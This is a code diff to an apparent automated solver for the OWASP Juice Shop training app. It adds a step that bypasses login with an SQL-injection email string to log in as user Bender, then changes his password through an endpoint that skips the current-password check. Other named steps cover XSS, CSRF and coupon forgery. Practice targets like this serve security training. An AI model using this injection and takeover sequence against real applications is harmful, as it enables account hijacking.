@@ -279,6 +279,20 @@ def _forged_coupon(c):
         pass
 
 
+def _change_bender(c):
+    """Change Bender's Password — SQLi-login as Bender (id 3), then change to the canonical
+    'slurmCl4ssic' with NO current password (endpoint only checks current when one is given)."""
+    a = _login(c, "bender@juice-sh.op'--", "x")
+    tok = a.get("token")
+    if not tok:
+        return
+    try:
+        c.get("/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic",
+              headers={"Authorization": "Bearer " + tok})
+    except Exception:
+        pass
+
+
 def _csrf(c):
     """CSRF — cross-origin POST /profile (Origin = the app's configured CSRF url) with a changed
     username; the profile update trusts the cookie token and mis-validates the request origin."""
@@ -392,7 +406,7 @@ def solve(base_url: str) -> dict:
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
-                     _forged_coupon, _two_factor, _feedback_patterns, _csrf):
+                     _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender):
             try:
                 step(c)
             except Exception:
